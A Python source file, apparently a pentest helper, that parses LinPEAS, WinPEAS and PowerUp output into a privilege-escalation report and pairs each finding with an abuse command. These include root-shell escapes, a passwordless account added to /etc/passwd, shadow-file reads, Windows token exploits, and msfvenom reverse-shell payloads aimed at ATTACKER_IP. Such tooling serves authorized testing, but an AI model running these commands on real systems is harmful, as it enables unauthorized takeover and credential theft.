"""
Privilege Escalation Report Generator
Parses LinPEAS, WinPEAS, PowerUp.ps1 output and produces a rich HTML report.
"""

import re
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

# ── ANSI helpers ──────────────────────────────────────────────────────────────
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mGKHF]|\x1b\].*?\x07|\r")


def _strip(text: str) -> str:
    return _ANSI_RE.sub("", text)


def _is_red_yellow(raw: str) -> bool:
    return "\x1b[1;31;103m" in raw or "\x1b[31;103m" in raw


def _is_red(raw: str) -> bool:
    return ("\x1b[1;31m" in raw or "\x1b[31m" in raw) and not _is_red_yellow(raw)


# ── Finding model ─────────────────────────────────────────────────────────────

@dataclass
class Finding:
    tool: str          # LinPEAS | WinPEAS | PowerUp
    severity: str      # critical | high | medium | info
    category: str
    title: str
    detail: str
    abuse: str = ""
    can_restart: bool | None = None


_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "info": 3}


def _max_sev(a: str, b: str) -> str:
    return a if _SEV_ORDER.get(a, 9) <= _SEV_ORDER.get(b, 9) else b


# ── SUID recipes (GTFOBins) ───────────────────────────────────────────────────

_SUID: dict[str, tuple[str, str]] = {
    "bash":    ("critical", "bash -p"),
    "sh":      ("critical", "sh -p"),
    "dash":    ("critical", "dash -p"),
    "python":  ("critical", "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
    "python2": ("critical", "python2 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
    "python3": ("critical", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
    "perl":    ("critical", "perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";'"),
    "ruby":    ("critical", "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"),
    "pkexec":  ("critical", "CVE-2021-4034 (PwnKit)  ← use pwnkit PoC"),
    "vim":     ("high",     "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-p\")'  OR  vim -c ':!/bin/bash'"),
    "vi":      ("high",     "vi -c ':!/bin/bash'"),
    "nmap":    ("high",     "echo 'os.execute(\"/bin/bash\")' > /tmp/x.nse; nmap --script /tmp/x.nse"),
    "awk":     ("high",     "awk 'BEGIN {system(\"/bin/bash\")}'"),
    "find":    ("high",     "find / -maxdepth 1 -exec /bin/bash -p \\; -quit"),
    "more":    ("high",     "MORE='!/bin/bash' more /etc/passwd"),
    "less":    ("high",     "less /etc/passwd  # then type: !/bin/bash"),
    "man":     ("high",     "man man  # then type: !/bin/bash"),
    "env":     ("high",     "env /bin/bash -p"),
    "tee":     ("high",     "echo 'root2::0:0:root:/root:/bin/bash' | tee -a /etc/passwd; su root2"),
    "cp":      ("high",     "cp /bin/bash /tmp/b; chmod +s /tmp/b; /tmp/b -p"),
    "nano":    ("high",     "nano /etc/passwd  # add root2::0:0:root:/root:/bin/bash"),
    "node":    ("high",     "node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'"),
    "php":     ("high",     "php -r 'pcntl_exec(\"/bin/bash\",[\"-p\"]);'"),
    "tar":     ("high",     "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"),
    "zip":     ("high",     "TF=$(mktemp -u); zip $TF /etc/hosts -T --unzip-command='sh -c /bin/bash'"),
    "git":     ("high",     "git -p help config  # then type: !/bin/bash"),
    "docker":  ("critical", "docker run -v /:/mnt --rm -it alpine chroot /mnt bash"),
    "gdb":     ("high",     "gdb -nx -ex 'python import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")' -ex quit"),
    "base64":  ("medium",   "base64 /etc/shadow | base64 --decode"),
    "openssl": ("high",     "openssl req -x509 -newkey rsa:4096 -keyout /dev/null  # or file read"),
    "rsync":   ("high",     "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"),
    "screen":  ("high",     "screen -x root/  # join root screen session (if exists)"),
    "strace":  ("medium",   "strace -p PID_OF_ROOT_PROCESS  # may reveal secrets"),
    "ftp":     ("medium",   "ftp; !/bin/bash"),
    "mysql":   ("high",     "mysql -e '\\! /bin/bash'"),
    # Note: passwd/sudo/newgrp/doas are normally SUID — omitted (not a finding by themselves)
    "nc":      ("medium",   "nc -e /bin/bash 127.0.0.1 PORT"),
    "tmux":    ("high",     "tmux  # try joining existing root session: tmux attach -t root"),
}

_SUDO_ABUSE: dict[str, str] = {
    "bash":    "sudo bash",
    "sh":      "sudo sh",
    "python":  "sudo python -c 'import os; os.system(\"/bin/bash\")'",
    "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
    "python2": "sudo python2 -c 'import os; os.system(\"/bin/bash\")'",
    "perl":    "sudo perl -e 'exec \"/bin/bash\";'",
    "ruby":    "sudo ruby -e 'exec \"/bin/bash\"'",
    "vim":     "sudo vim -c ':!/bin/bash'",
    "vi":      "sudo vi -c ':!/bin/bash'",
    "nano":    "sudo nano /etc/sudoers",
    "nmap":    "echo 'os.execute(\"/bin/bash\")' > /tmp/x.nse; sudo nmap --script /tmp/x.nse",
    "find":    "sudo find / -exec /bin/bash \\; -quit",
    "awk":     "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "less":    "sudo less /etc/passwd  # then: !/bin/bash",
    "more":    "sudo more /etc/passwd  # then: !/bin/bash",
    "man":     "sudo man man  # then: !/bin/bash",
    "env":     "sudo env /bin/bash",
    "tee":     "echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd; su root2",
    "cp":      "sudo cp /bin/bash /tmp/b; sudo chmod +s /tmp/b; /tmp/b -p",
    "tar":     "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "git":     "sudo git -p help  # then: !/bin/bash",
    "node":    "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
    "php":     "sudo php -r 'system(\"/bin/bash\");'",
    "docker":  "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
    "mysql":   "sudo mysql -e '\\! /bin/bash'",
    "base64":  "sudo base64 /etc/shadow | base64 --decode",
    "rsync":   "sudo rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "zip":     "TF=$(mktemp -u); sudo zip $TF /etc/hosts -T --unzip-command='sh -c /bin/bash'",
    "ALL":     "sudo su -",
    "su":      "sudo su -",
}

_TOKEN_PRIVS: dict[str, tuple[str, str]] = {
    "SeImpersonatePrivilege":        ("critical", "PrintSpoofer64.exe -i -c cmd  OR  GodPotato.exe -cmd cmd  OR  JuicyPotatoNG.exe"),
    "SeAssignPrimaryTokenPrivilege": ("critical", "PrintSpoofer64.exe -i -c cmd  OR  GodPotato.exe -cmd cmd"),
    "SeDebugPrivilege":              ("critical", "Inject into LSASS → dump creds  OR  CreateProcessWithToken from SYSTEM process"),
    "SeBackupPrivilege":             ("high",     "reg save hklm\\sam c:\\sam.bak && reg save hklm\\system c:\\sys.bak  # offline ntlm"),
    "SeRestorePrivilege":            ("high",     "Overwrite sensitive files: reg restore / write to System32"),
    "SeTakeOwnershipPrivilege":      ("high",     "takeown /f C:\\Windows\\System32\\target.exe && icacls ... /grant"),
    "SeLoadDriverPrivilege":         ("high",     "Load malicious kernel driver → SYSTEM"),
    "SeManageVolumePrivilege":       ("high",     "Arbitrary file read/write via SetFileValidData"),
    "SeCreateTokenPrivilege":        ("critical", "Forge arbitrary access token including SYSTEM"),
    "SeTcbPrivilege":                ("critical", "Create any token including SYSTEM via LsaLogonUser"),
    "SeEnableDelegationPrivilege":   ("high",     "Kerberos unconstrained delegation abuse"),
    "SeCreateSymbolicLinkPrivilege": ("high",     "Symlink → arbitrary file read/write as SYSTEM"),
    "SeRelabelPrivilege":            ("high",     "Change object integrity label"),
}

_LINUX_CVES: list[tuple[str, str, str, str]] = [
    # (regex, cve_id, description, base_severity)
    (r"CVE-2021-4034|PwnKit",       "CVE-2021-4034", "PwnKit (pkexec) — universal Linux privesc",           "critical"),
    (r"CVE-2022-0847|DirtyPipe",    "CVE-2022-0847", "Dirty Pipe — Linux kernel 5.8–5.16",                  "critical"),
    (r"CVE-2016-5195|DirtyCow",     "CVE-2016-5195", "Dirty COW — kernel < 4.8.3",                          "critical"),
    (r"CVE-2021-3156|Baron.*Same",  "CVE-2021-3156", "Sudo Baron Samedit heap overflow",                     "critical"),
    (r"CVE-2019-14287",             "CVE-2019-14287", "Sudo -1 / #uid bypass",                               "critical"),
    (r"CVE-2023-0386|OverlayFS",    "CVE-2023-0386", "OverlayFS SUID smuggling",                             "critical"),
    (r"CVE-2022-0995",              "CVE-2022-0995", "watch_queue OOB write",                                 "high"),
    (r"CVE-2022-2586",              "CVE-2022-2586", "nft_object UAF (CAP_NET_ADMIN)",                        "high"),
    (r"CVE-2022-32250",             "CVE-2022-32250","nftables UAF NEWSET",                                   "high"),
    (r"CVE-2022-1015",              "CVE-2022-1015", "nf_tables OOB write",                                   "high"),
    (r"CVE-2021-22555",             "CVE-2021-22555","netfilter heap OOB write",                              "high"),
    (r"CVE-2018-18955",             "CVE-2018-18955","newuidmap/newgidmap privesc",                           "high"),
    (r"CVE-2019-18634",             "CVE-2019-18634","Sudo pwfeedback stack overflow",                        "high"),
    (r"CVE-2017-1000112",           "CVE-2017-1000112","UFO memory corruption",                               "high"),
]


# ── Main analyzer ─────────────────────────────────────────────────────────────

class PrivEscAnalyzer:

    @staticmethod
    def detect_tool(text: str) -> str:
        head = text[:2000]
        if "LinPEAS" in head or "linpeas" in head.lower():
            return "linpeas"
        if "WinPEAS" in head or "winpeas" in head.lower() or "winpeass" in head.lower():
            return "winpeas"
        stripped_head = _strip(head)
        if "AbuseFunction" in stripped_head or ("ServiceName" in stripped_head and "Check" in stripped_head):
            return "powerup"
        if "Linux version" in stripped_head or "/etc/passwd" in stripped_head:
            return "linpeas"
        if "Windows" in stripped_head and ("Privilege" in stripped_head or "Service" in stripped_head):
            return "winpeas"
        return "unknown"

    def analyze_files(self, files: list[str]) -> list[Finding]:
        all_findings: list[Finding] = []
        for f in files:
            path = Path(f)
            if not path.exists():
                continue
            text = path.read_text(errors="replace")
            tool = self.detect_tool(text)
            if tool == "linpeas":
                all_findings += self._parse_linpeas(text)
            elif tool == "winpeas":
                all_findings += self._parse_winpeas(text)
            elif tool == "powerup":
                all_findings += self._parse_powerup(text)
            else:
                # Try all parsers
                all_findings += self._parse_linpeas(text)
                all_findings += self._parse_winpeas(text)
                all_findings += self._parse_powerup(text)
        # Dedup: AutoLogon/Credentials are cross-tool — deduplicate by (category, title_norm)
        seen: set[tuple] = set()
        deduped: list[Finding] = []
        for f in all_findings:
            # For cross-tool categories, omit tool from key so WinPEAS+PowerUp don't duplicate
            cross_tool_cats = {"AutoLogon Credentials", "Service Misconfiguration", "DLL Hijacking"}
            tool_key = "" if f.category in cross_tool_cats else f.tool
            key = (tool_key, f.category, f.title[:70])
            if key not in seen:
                seen.add(key)
                deduped.append(f)
        return sorted(deduped, key=lambda x: (_SEV_ORDER.get(x.severity, 9), x.category))

    # ── LinPEAS ──────────────────────────────────────────────────────────────

    def _parse_linpeas(self, text: str) -> list[Finding]:
        findings: list[Finding] = []
        lines = text.splitlines()
        stripped = [_strip(l) for l in lines]

        section = ""
        in_suid = False
        in_caps = False
        in_sudo = False
        in_cron = False

        for i, (raw, s) in enumerate(zip(lines, stripped)):
            s_clean = s.strip()
            if not s_clean:
                continue

            # Section header detection
            if re.search(r"[╔═]{3,}.*[╣╠╚]", s_clean):
                sec_m = re.search(r"[╣╠╚]\s*(.+)", s_clean)
                if sec_m:
                    section = sec_m.group(1).strip().lower()
                    in_suid  = any(k in section for k in ("suid", "sgid"))
                    in_caps  = "capabilit" in section
                    in_sudo  = "sudo" in section
                    in_cron  = "cron" in section
                continue

            is_ry = _is_red_yellow(raw)
            is_r  = _is_red(raw)

            # ── Kernel CVEs ──────────────────────────────────────────────
            for pat, cve, desc, sev in _LINUX_CVES:
                if re.search(pat, s_clean, re.I):
                    if is_ry:
                        sev = "critical"
                    elif is_r:
                        sev = _max_sev(sev, "high")
                    findings.append(Finding(
                        tool="LinPEAS", severity=sev,
                        category="Kernel CVE",
                        title=f"{cve} — {desc}",
                        detail=s_clean[:140],
                        abuse=f"searchsploit {cve}  ||  https://github.com/search?q={cve}",
                    ))
                    break

            # ── Sudo NOPASSWD ─────────────────────────────────────────────
            if re.search(r"NOPASSWD", s_clean):
                cmd_m = re.search(r"NOPASSWD\s*:\s*(.+)", s_clean)
                cmds = cmd_m.group(1).strip() if cmd_m else s_clean
                sev = "critical" if re.search(r"(ALL|/bin/bash|/bin/sh|python|perl|ruby)", cmds, re.I) else "high"
                # Build abuse command
                first_cmd = re.split(r"[,\s]+", cmds.strip())[0]
                base = first_cmd.rsplit("/", 1)[-1].lower()
                if "ALL" in cmds.upper() and "NOPASSWD" in s_clean:
                    abuse = "sudo su -"
                else:
                    abuse = _SUDO_ABUSE.get(base, f"sudo {first_cmd}  # https://gtfobins.github.io/gtfobins/{base}/")
                findings.append(Finding(
                    tool="LinPEAS", severity=sev,
                    category="Sudo NOPASSWD",
                    title=f"NOPASSWD: {cmds[:60]}",
                    detail=s_clean[:140],
                    abuse=abuse,
                ))

            # ── SUID / SGID binaries ──────────────────────────────────────
            if in_suid:
                path_m = re.search(r"((?:/[\w.+-]+){2,})", s_clean)
                if path_m:
                    bin_path = path_m.group(1)
                    # snap packages are isolated containers — SUID bits inside them
                    # do not affect the host system, so these are never exploitable.
                    if bin_path.startswith("/snap/"):
                        continue
                    binary = bin_path.rsplit("/", 1)[-1].lower()
                    binary = re.sub(r"\d+$", "", binary)  # strip version suffix
                    if binary in _SUID:
                        sev, abuse = _SUID[binary]
                        if is_ry:
                            sev = "critical"
                        findings.append(Finding(
                            tool="LinPEAS", severity=sev,
                            category="SUID Binary",
                            title=f"SUID: {bin_path}",
                            detail=s_clean[:140],
                            abuse=abuse,
                        ))

            # ── Linux capabilities ────────────────────────────────────────
            if in_caps or re.search(r"cap_setuid|cap_sys_admin|cap_net_raw|cap_dac_read|cap_sys_ptrace", s_clean, re.I):
                cap_m = re.search(r"(cap_\w+)\+ep", s_clean, re.I)
                if cap_m:
                    cap = cap_m.group(1).lower()
                    bin_m = re.search(r"(/[\w/]+)\s*=", s_clean)
                    binary = bin_m.group(1).rsplit("/", 1)[-1] if bin_m else "binary"
                    sev = "critical" if cap in ("cap_setuid", "cap_sys_admin") else "high"
                    cap_abuse = {
                        "cap_setuid":       f"{binary} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' # python\n{binary} -e 'POSIX::setuid(0); exec \"/bin/bash\";' # perl",
                        "cap_sys_admin":    "unshare --map-root-user --user /bin/bash  # namespace escape",
                        "cap_net_raw":      "tcpdump -i any -w /tmp/cap.pcap  # capture creds",
                        "cap_dac_read_search": f"{binary} /etc/shadow  # read any file",
                        "cap_sys_ptrace":   "Attach ptrace to root process → inject shellcode",
                    }.get(cap, f"{cap}+ep on {binary} — https://gtfobins.github.io/")
                    findings.append(Finding(
                        tool="LinPEAS", severity=sev,
                        category="Linux Capability",
                        title=f"{cap}+ep → {binary}",
                        detail=s_clean[:140],
                        abuse=cap_abuse,
                    ))

            # ── NFS no_root_squash ────────────────────────────────────────
            if re.search(r"no_root_squash", s_clean, re.I):
                nfs_m = re.search(r"(/[\w/]+)", s_clean)
                share = nfs_m.group(1) if nfs_m else "SHARE"
                findings.append(Finding(
                    tool="LinPEAS", severity="high",
                    category="NFS no_root_squash",
                    title=f"NFS no_root_squash: {share}",
                    detail=s_clean[:140],
                    abuse=(
                        f"# Attacker: mount -o rw,vers=2 TARGET:{share} /mnt/nfs\n"
                        f"cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash\n"
                        f"# Target: {share}/bash -p"
                    ),
                ))

            # ── World-writable sensitive files ────────────────────────────
            if re.search(r"(-rw-rw-rw-|-rwxrwxrwx)", s_clean):
                if re.search(r"/etc/(passwd|shadow|sudoers)", s_clean):
                    target_m = re.search(r"/etc/(\w+)", s_clean)
                    target = target_m.group(0) if target_m else "/etc/passwd"
                    abuse = (
                        f"echo 'r00t:$(openssl passwd -1 p4ss):0:0:root:/root:/bin/bash' >> /etc/passwd\nsu r00t  # password: p4ss"
                        if "passwd" in target else
                        f"# Replace root hash in {target}\npython3 -c \"import crypt; print(crypt.crypt('p4ss'))\""
                    )
                    findings.append(Finding(
                        tool="LinPEAS", severity="critical",
                        category="Writable Sensitive File",
                        title=f"World-writable: {target}",
                        detail=s_clean[:140],
                        abuse=abuse,
                    ))

            # ── Docker socket ─────────────────────────────────────────────
            if re.search(r"/var/run/docker\.sock", s_clean):
                findings.append(Finding(
                    tool="LinPEAS", severity="critical",
                    category="Container Escape",
                    title="Docker socket accessible (/var/run/docker.sock)",
                    detail=s_clean[:140],
                    abuse="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                ))

            # ── SSH private keys ──────────────────────────────────────────
            if re.search(r"-----BEGIN.*PRIVATE KEY|\.ssh/(id_rsa|id_ecdsa|id_ed25519)(?!\s*\.pub)", s_clean):
                findings.append(Finding(
                    tool="LinPEAS", severity="high",
                    category="SSH Private Key",
                    title="SSH private key found",
                    detail=s_clean[:140],
                    abuse="chmod 600 /path/to/key && ssh -i /path/to/key root@localhost",
                ))

            # ── Writable cron ─────────────────────────────────────────────
            if in_cron and re.search(r"(writable|write.*cron|cron.*write|You can write)", s_clean, re.I):
                findings.append(Finding(
                    tool="LinPEAS", severity="high",
                    category="Writable Cron",
                    title="Writable cron script",
                    detail=s_clean[:140],
                    abuse="echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh  # wait for execution",
                ))

            # ── PATH injection ────────────────────────────────────────────
            if re.search(r"(Writable.*PATH|writable.*in.*PATH|PATH.*writable)", s_clean, re.I):
                dir_m = re.search(r"(/[\w/]{4,})", s_clean)
                writable_dir = dir_m.group(1) if dir_m else None
                # Skip if path looks like a URL fragment (/en/, //book, /index etc.)
                if not writable_dir or re.match(r"^//|^/en|^/linux|^/windows|^/index", writable_dir):
                    continue
                findings.append(Finding(
                    tool="LinPEAS", severity="high",
                    category="PATH Injection",
                    title=f"Writable PATH dir: {writable_dir}",
                    detail=s_clean[:140],
                    abuse=(
                        f"# Create fake binary used by privileged process:\n"
                        f"cat > {writable_dir}/target_binary << 'EOF'\n"
                        f"#!/bin/bash\nchmod +s /bin/bash\nEOF\nchmod +x {writable_dir}/target_binary"
                    ),
                ))

            # ── Cleartext credentials (RED/YELLOW only — high confidence) ─
            if is_ry and re.search(r"(password|passwd|secret|pwd)\s*[=:]", s_clean, re.I):
                pw_m = re.search(r"(?:password|passwd|secret|pwd)\s*[=:]\s*(\S{4,})", s_clean, re.I)
                if pw_m and not re.match(r"^(\*+|null|none|false|true|N/A)$", pw_m.group(1), re.I):
                    findings.append(Finding(
                        tool="LinPEAS", severity="high",
                        category="Cleartext Credential",
                        title="Cleartext password found",
                        detail=s_clean[:140],
                        abuse=f"Try: su - USER  OR  ssh USER@TARGET  with: {pw_m.group(1)}",
                    ))

        return findings

    # ── WinPEAS ──────────────────────────────────────────────────────────────

    # Paths that belong to the current user — processes running from here are
    # the CURRENT USER, so write access gives no privilege escalation.
    # Only C:\Users\Public\ is shared and may be loaded by elevated processes.
    @staticmethod
    def _is_user_appdata(path: str) -> bool:
        p = path.lower().replace("/", "\\")
        # Matches C:\Users\<anything except Public>\...
        m = re.match(r"c:\\users\\(?!public\\)([^\\]+)\\", p)
        return bool(m)

    # Password policy flag patterns — NOT actual passwords
    _POLICY_FLAGS_RE = re.compile(
        r"^(CanChange|NotChange|NotExp|NotReq|Required|Expired|Enabled|Disabled"
        r"|MinAge|MaxAge|MinLen|BadCount|LockDur|LockObs"
        r"|CanChange-|NotChange-|NotExp-|NotReq-|\d+days?|\d+mins?)",
        re.I,
    )

    def _parse_winpeas(self, text: str) -> list[Finding]:
        findings: list[Finding] = []
        lines = text.splitlines()
        stripped = [_strip(l) for l in lines]
        ctx = stripped

        for i, (raw, s) in enumerate(zip(lines, stripped)):
            sc = s.strip()
            if not sc:
                continue

            is_r = _is_red(raw) or _is_red_yellow(raw)

            def _ctx(n=3) -> str:
                return "\n".join(ctx[max(0, i-n):i+n+1])

            # ── Token privileges ─────────────────────────────────────────
            # ONLY dangerous ones — skip informational/low-value ones
            for priv, (sev, abuse) in _TOKEN_PRIVS.items():
                if priv in sc:
                    findings.append(Finding(
                        tool="WinPEAS", severity=sev,
                        category="Token Privilege",
                        title=priv,
                        detail=sc[:140],
                        abuse=abuse,
                    ))
                    break

            # ── AlwaysInstallElevated ────────────────────────────────────
            if "AlwaysInstallElevated" in sc and re.search(r"\b1\b|enabled|Yes|True", sc, re.I):
                findings.append(Finding(
                    tool="WinPEAS", severity="critical",
                    category="AlwaysInstallElevated",
                    title="AlwaysInstallElevated = 1  → MSI runs as SYSTEM",
                    detail=sc[:140],
                    abuse=(
                        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi > evil.msi\n"
                        "msiexec /quiet /qn /i evil.msi"
                    ),
                ))

            # ── AutoLogon ───────────────────────────────────────────────
            if re.search(r"(DefaultPassword|Some AutoLogon credentials|AutoAdminLogon)", sc, re.I):
                # Expand context to catch user/pw on adjacent lines
                block = _ctx(6)
                user_m = re.search(r"DefaultUserName\s*:\s*(\S+)", block, re.I)
                pw_m   = re.search(r"DefaultPassword\s*:\s*(\S+)", block, re.I)
                user = user_m.group(1) if user_m else None
                pw   = pw_m.group(1)   if pw_m   else None
                if not user:
                    continue  # no actual user found, skip noise
                _winlogon_key = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
                pw_str = pw if pw else "(enumerate: reg query " + _winlogon_key + ")"
                findings.append(Finding(
                    tool="WinPEAS", severity="high",
                    category="AutoLogon Credentials",
                    title=f"Registry AutoLogon: user={user}",
                    detail=f"User: {user}  |  Password: {pw_str}",
                    abuse=(
                        f"reg query \"{_winlogon_key}\"\n"
                        f"# Then: runas /user:{user} cmd  # use found password\n"
                        f"# Or: evil-winrm -i TARGET -u {user} -p PASSWORD"
                    ),
                ))

            # ── Unquoted service path ─────────────────────────────────────
            if re.search(r"(No quotes and space detected|Unquoted.*service path)", sc, re.I):
                if re.search(r"https?://", sc):
                    continue
                # Extract service name from context
                svc_m = re.search(r"([\w\s]{3,30})\s*:.*No quotes", sc, re.I)
                if not svc_m:
                    svc_m = re.search(r"^([\w]{3,30})\s", sc)
                svc = svc_m.group(1).strip() if svc_m else "SERVICE"
                # Extract the actual path
                path_m = re.search(r"(C:\\[^\"]+\s[^\"]+\.exe)", sc, re.I)
                path_str = path_m.group(1) if path_m else "(check sc qc SERVICE)"
                findings.append(Finding(
                    tool="WinPEAS", severity="high",
                    category="Service Misconfiguration",
                    title=f"Unquoted service path: {svc}",
                    detail=f"Path: {path_str}",
                    abuse=(
                        f"# Find truncated path, e.g. 'C:\\Program Files\\App\\svc.exe'\n"
                        f"# → drop payload at C:\\Program.exe\n"
                        f"msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe > C:\\Program.exe\n"
                        f"sc stop {svc} && sc start {svc}  # or wait for reboot"
                    ),
                ))

            # ── Modifiable service binary (in service section) ────────────
            if is_r and re.search(r"You can modify.*binary path|modifi.*service.*binary", sc, re.I):
                svc_m = re.search(r"([\w]{3,30})", sc)
                svc = svc_m.group(1) if svc_m else "SERVICE"
                findings.append(Finding(
                    tool="WinPEAS", severity="high",
                    category="Service Misconfiguration",
                    title=f"Modifiable service binary: {svc}",
                    detail=sc[:140],
                    abuse=(
                        f"msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe > svc.exe\n"
                        f"copy svc.exe \"C:\\path\\to\\{svc}.exe\"\n"
                        f"sc stop {svc} && sc start {svc}"
                    ),
                ))

            # ── DLL hijacking ─────────────────────────────────────────────
            # PRACTICAL OSCP RULE: Only flag system/shared directories.
            # C:\Users\username\AppData\... is user-owned → process loads as that user → no privesc.
            # Only valuable if a SYSTEM/Admin service loads DLLs from this path.
            if re.search(r"(Possible DLL Hijack|DLL Hijack.*folder|Hijacking folder)", sc, re.I):
                path_m = re.search(r"(C:\\.*)\s+\([^[\n]*\[Allow:", sc)
                if not path_m:
                    path_m = re.search(r"(C:\\[^\s(]+)", sc)
                dll_dir = path_m.group(1).rstrip("\\") if path_m else None
                if not dll_dir:
                    continue
                # Skip user-owned AppData paths (no privilege escalation possible)
                if self._is_user_appdata(dll_dir):
                    continue
                # Skip C:\Users\Public\ subdirectories that don't look like service paths
                # (OneDrive, EdgeUpdate in Public is also noise)
                if re.search(r"c:\\users\\public\\(.*onedrive|.*edge|.*chrome|.*browser)", dll_dir, re.I):
                    continue
                findings.append(Finding(
                    tool="WinPEAS", severity="high",
                    category="DLL Hijacking",
                    title=f"DLL hijack (system path): {dll_dir}",
                    detail=sc[:140],
                    abuse=(
                        f"# Identify which SYSTEM/Admin process loads DLLs from this dir:\n"
                        f"# procmon filter: Path contains \"{dll_dir}\" AND Result = NAME NOT FOUND\n"
                        f"msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll > hijack.dll\n"
                        f"copy hijack.dll \"{dll_dir}\\TargetDll.dll\"\n"
                        f"# Restart service or trigger the application"
                    ),
                ))

            # ── Registry cleartext password ───────────────────────────────
            # STRICT: Only emit if value looks like an actual password, not a policy flag
            if is_r and re.search(r"(?i)(?:password|pwd)\s*[=:]\s*\S{3}", sc):
                pw_m = re.search(r"(?:password|pwd)\s*[=:]\s*(\S+)", sc, re.I)
                if pw_m:
                    pw_val = pw_m.group(1)
                    # Reject policy flags: "CanChange-NotExpi-NotReq", "NotRequired", etc.
                    if self._POLICY_FLAGS_RE.match(pw_val):
                        pass  # skip
                    # Reject common non-password values
                    elif re.match(r"^(null|none|false|true|0|1|disabled|enabled|n/a|required|not|can|min|max)$", pw_val, re.I):
                        pass
                    # Reject values that look like flags (multiple CamelCase or hyphen-joined words)
                    elif re.match(r"^([A-Z][a-z]+-)+[A-Z][a-z]+$", pw_val):
                        pass
                    else:
                        findings.append(Finding(
                            tool="WinPEAS", severity="high",
                            category="Registry Credential",
                            title=f"Cleartext password in registry: {pw_val}",
                            detail=sc[:140],
                            abuse=f"Try: net use / psexec / evil-winrm with password: {pw_val}",
                        ))

            # ── DPAPI master keys / credential manager ────────────────────
            if re.search(r"(DPAPI.*masterkey|Target.*:.*MicrosoftOffice|credential.*found.*domain|cmdkey.*list.*found)", sc, re.I):
                findings.append(Finding(
                    tool="WinPEAS", severity="high",
                    category="Stored Credentials",
                    title="DPAPI / Credential Manager creds found",
                    detail=sc[:140],
                    abuse=(
                        "# List stored credentials:\ncmdkey /list\n"
                        "# Use with runas:\nrunas /savecred /user:DOMAIN\\USER cmd\n"
                        "# Dump DPAPI: mimikatz # sekurlsa::dpapi"
                    ),
                ))

            # ── PowerShell history file with content hint ─────────────────
            # Only emit if WinPEAS hints at actual content in the history
            if re.search(r"ConsoleHost_history.*txt", sc, re.I):
                # Check surrounding lines for any actual commands being shown
                block = _ctx(4)
                if re.search(r"(password|passwd|cred|net use|invoke|wget|iwr|runas)", block, re.I):
                    findings.append(Finding(
                        tool="WinPEAS", severity="high",
                        category="Stored Credentials",
                        title="Credentials in PowerShell history",
                        detail=sc[:140],
                        abuse="type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
                    ))

            # ── UAC disabled (ConsentPromptBehaviorAdmin = 0) ─────────────
            # Only flag value 0 — UAC completely off, any admin process runs elevated.
            # Default (5) and other values still have UAC and are not noteworthy alone.
            if re.search(r"ConsentPromptBehaviorAdmin\s*:\s*0\b", sc):
                findings.append(Finding(
                    tool="WinPEAS", severity="critical",
                    category="UAC Disabled",
                    title="UAC completely disabled (ConsentPromptBehaviorAdmin = 0)",
                    detail=sc[:140],
                    abuse=(
                        "# UAC is OFF — any medium-integrity admin process runs elevated\n"
                        "# If you have an admin account, just run cmd.exe — no bypass needed\n"
                        "runas /user:ADMIN cmd  # or just use the admin creds you found"
                    ),
                ))

            # ── LAPS not installed ────────────────────────────────────────
            if re.search(r"LAPS.*(not installed|n/a|False)", sc, re.I):
                findings.append(Finding(
                    tool="WinPEAS", severity="medium",
                    category="LAPS",
                    title="LAPS not installed — uniform local admin password likely",
                    detail=sc[:140],
                    abuse=(
                        "# If you crack/know local admin password on one machine:\n"
                        "crackmapexec smb CIDR -u Administrator -p PASSWORD --local-auth\n"
                        "# Or pass-the-hash to all machines"
                    ),
                ))

        return findings


    # ── PowerUp ──────────────────────────────────────────────────────────────

    def _parse_powerup(self, text: str) -> list[Finding]:
        findings: list[Finding] = []
        text = _strip(text)
        blocks = re.split(r"\n(?:\s*\n)+", text)

        for block in blocks:
            if not block.strip():
                continue
            props: dict[str, str] = {}
            for line in block.splitlines():
                m = re.match(r"^\s*(\w[\w\s]*?)\s{2,}:\s*(.+)", line)
                if m:
                    props[m.group(1).strip()] = m.group(2).strip()
            if not props or not props.get("Check"):
                continue

            check = props["Check"]
            abuse_fn = props.get("AbuseFunction", "")
            can_restart = props.get("CanRestart", "False").lower() in ("true", "yes", "1")
            svc = props.get("ServiceName", props.get("Name", ""))
            path = props.get("Path", props.get("ModifiablePath", ""))
            perms = props.get("ModifiableFilePermissions", props.get("Permissions", ""))
            identity = props.get("ModifiableFileIdentityReference", props.get("IdentityReference", ""))

            if "Modifiable Service" in check:
                sev = "critical" if can_restart else "high"
                note = "\n# ⚡ Service can be restarted → immediate exploitation!" if can_restart else "\n# CanRestart: False → wait for reboot or manual trigger"
